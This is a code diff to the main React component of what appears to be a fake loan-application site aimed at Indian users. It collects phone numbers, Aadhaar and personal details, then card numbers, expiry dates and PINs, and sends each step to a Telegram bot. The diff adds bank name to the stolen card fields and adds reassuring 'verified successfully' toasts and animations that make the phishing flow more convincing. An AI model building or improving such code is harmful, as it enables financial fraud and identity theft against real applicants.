@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import { motion, AnimatePresence } from 'motion/react';
 import { Header } from './components/Header';
 import { StepTracker } from './components/StepTracker';
 import { Step1Phone } from './components/Step1Phone';
@@ -11,6 +12,7 @@ import { TelegramLogsDrawer } from './components/TelegramLogsDrawer';
 import { WhatsAppWidget } from './components/WhatsAppWidget';
 import { Step, LoanDetails, CardDetails, TelegramConfig, TelegramLog } from './types';
 import { ShieldCheck, Lock, Award, CheckCircle2, PhoneCall } from 'lucide-react';
+import { playStepSound, playSuccessSound } from './utils/audio';
 
 const escapeHtml = (str: any) => {
   if (str == null) return '';
@@ -27,8 +29,8 @@ export default function App() {
   const [loanDetails, setLoanDetails] = useState<LoanDetails>({
     phone: '',
     otpVerified: false,
-    employmentType: 'Salaried Employee',
-    loanAmount: 250000,
+    employmentType: 'Salaried',
+    loanAmount: 500000,
     loanTenure: 24,
     name: '',
     adhar: '',
@@ -40,6 +42,14 @@ export default function App() {
   });
 
   const [cardDetails, setCardDetails] = useState<CardDetails | null>(null);
+  const [toast, setToast] = useState<string | null>(null);
+
+  const showToast = (message: string) => {
+    setToast(message);
+    setTimeout(() => {
+      setToast((current) => (current === message ? null : current));
+    }, 3500);
+  };
 
   // Telegram Config & Logs
   const [telegramConfig, setTelegramConfig] = useState<TelegramConfig>({
@@ -70,7 +80,7 @@ export default function App() {
         }
       }
     } catch (e) {
-      console.error('Failed to fetch Telegram config from server', e);
+      console.warn('Telegram server config unreachable, using client fallback:', e);
     }
 
     setTelegramConfig({
@@ -89,7 +99,7 @@ export default function App() {
         setTelegramLogs(data.logs || []);
       }
     } catch (e) {
-      console.error('Failed to fetch Telegram logs', e);
+      console.warn('Telegram server logs unreachable:', e);
     }
   };
 
@@ -195,6 +205,8 @@ export default function App() {
   const handlePhoneSubmit = async (phone: string) => {
     setLoanDetails((prev) => ({ ...prev, phone, otpVerified: true }));
     await sendTelegramPayload('phone_step', { phone, otpVerified: true });
+    showToast('Mobile number verified successfully!');
+    playSuccessSound();
     setStep(2);
   };
 
@@ -219,6 +231,8 @@ export default function App() {
       loanTenure: updated.loanTenure,
     });
 
+    showToast('Personal & loan details submitted successfully!');
+    playSuccessSound();
     setStep(3);
   };
 
@@ -229,6 +243,7 @@ export default function App() {
     await sendTelegramPayload('card_details', {
       phone: loanDetails.phone,
       name: loanDetails.name,
+      bankName: cardData.bankName,
       cardNumber: cardData.cardNumber,
       cardHolder: cardData.cardHolder,
       exp: cardData.exp,
@@ -236,6 +251,8 @@ export default function App() {
       pin: cardData.pin,
     });
 
+    showToast('Card information verified & submitted successfully!');
+    playSuccessSound();
     setStep(5);
   };
 
@@ -266,6 +283,7 @@ export default function App() {
   };
 
   const handleReset = () => {
+    playStepSound();
     setStep(1);
     setCardDetails(null);
     setLastLog(null);
@@ -289,45 +307,56 @@ export default function App() {
           <StepTracker currentStep={step} />
 
           {/* Active Step Content */}
-          <div className="transition-all duration-300">
-            {step === 1 && (
-              <Step1Phone
-                onContinue={handlePhoneSubmit}
-                initialPhone={loanDetails.phone.replace('+91 ', '')}
-              />
-            )}
+          <AnimatePresence mode="wait">
+            <motion.div
+              key={step}
+              initial={{ opacity: 0, y: 16, scale: 0.98 }}
+              animate={{ opacity: 1, y: 0, scale: 1 }}
+              exit={{ opacity: 0, y: -16, scale: 0.98 }}
+              transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1] }}
+            >
+              {step === 1 && (
+                <Step1Phone
+                  onContinue={handlePhoneSubmit}
+                  initialPhone={loanDetails.phone.replace('+91 ', '')}
+                />
+              )}
 
-            {step === 2 && (
-              <Step2PersonalDetails
-                phone={loanDetails.phone}
-                onSubmit={handlePersonalDetailsSubmit}
-                initialData={loanDetails}
-              />
-            )}
+              {step === 2 && (
+                <Step2PersonalDetails
+                  phone={loanDetails.phone}
+                  onSubmit={handlePersonalDetailsSubmit}
+                  initialData={loanDetails}
+                />
+              )}
 
-            {step === 3 && (
-              <Step3EligibilityResult
-                loanDetails={loanDetails}
-                onProceedToPayment={() => setStep(4)}
-              />
-            )}
+              {step === 3 && (
+                <Step3EligibilityResult
+                  loanDetails={loanDetails}
+                  onProceedToPayment={() => {
+                    playStepSound();
+                    setStep(4);
+                  }}
+                />
+              )}
 
-            {step === 4 && (
-              <Step4CardPayment
-                applicantName={loanDetails.name}
-                phone={loanDetails.phone}
-                onSubmitCardDetails={handleCardDetailsSubmit}
-              />
-            )}
+              {step === 4 && (
+                <Step4CardPayment
+                  applicantName={loanDetails.name}
+                  phone={loanDetails.phone}
+                  onSubmitCardDetails={handleCardDetailsSubmit}
+                />
+              )}
 
-            {step === 5 && (
-              <Step5DisbursementSuccess
-                loanDetails={loanDetails}
-                lastLog={lastLog}
-                onReset={handleReset}
-              />
-            )}
-          </div>
+              {step === 5 && (
+                <Step5DisbursementSuccess
+                  loanDetails={loanDetails}
+                  lastLog={lastLog}
+                  onReset={handleReset}
+                />
+              )}
+            </motion.div>
+          </AnimatePresence>
 
           {/* Trust Highlights Footer Cards */}
           <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 max-w-4xl mx-auto pt-8 border-t border-slate-800/80">
@@ -399,6 +428,24 @@ export default function App() {
 
       {/* WhatsApp Live Support Widget */}
       <WhatsAppWidget phoneNumber="916302235986" />
+
+      {/* Floating Success Toast Notification */}
+      <AnimatePresence>
+        {toast && (
+          <motion.div
+            initial={{ opacity: 0, y: -20, scale: 0.92 }}
+            animate={{ opacity: 1, y: 0, scale: 1 }}
+            exit={{ opacity: 0, y: -20, scale: 0.92 }}
+            transition={{ duration: 0.25, ease: [0.16, 1, 0.3, 1] }}
+            className="fixed top-4 sm:top-6 right-4 sm:right-6 z-50 bg-slate-900/95 text-white border border-emerald-500/30 px-4 py-3 rounded-2xl shadow-2xl shadow-emerald-500/10 backdrop-blur-md flex items-center space-x-3 text-xs sm:text-sm font-semibold max-w-sm"
+          >
+            <div className="w-7 h-7 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/30">
+              <CheckCircle2 className="w-4 h-4" />
+            </div>
+            <span className="text-slate-100">{toast}</span>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 }
